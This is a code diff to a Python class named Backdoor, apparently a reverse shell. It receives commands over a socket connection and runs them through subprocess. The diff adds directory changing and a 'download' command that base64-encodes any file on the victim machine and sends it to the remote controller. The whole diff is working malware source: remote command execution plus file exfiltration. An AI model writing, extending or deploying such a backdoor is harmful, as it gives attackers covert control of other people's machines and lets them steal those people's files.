@@ -1,8 +1,10 @@
-#!/usr/bin/env python
+#!/usr/bin/python3
+import json_communicate as comms
 import socket
 import subprocess
 import json
-import json_communicate as comms
+import os
+import base64
 
 
 class Backdoor:
@@ -15,14 +17,27 @@ class Backdoor:
         print("[+] received command " + cmdstr)
         return subprocess.getoutput(cmdstr)
 
+    def cwd_to(self, path):
+        if path and os.path.exists(path):
+            os.chdir(path)
+        return subprocess.getoutput("pwd")
+
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read()).decode('UTF-8')
+
     def run(self):
         while True:
             command = comms.receive(self.connection)
             if command[0] == "exit":
                 self.connection.close()
                 exit()
-
-            command_result = self.execute_system_command(command)
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.cwd_to(command[1])
+            elif command[0] == "download":
+                command_result = self.read_file(command[1])
+            else:
+                command_result = self.execute_system_command(command)
             print(command_result)
             comms.send(self.connection, command_result)
         self.connection.close()
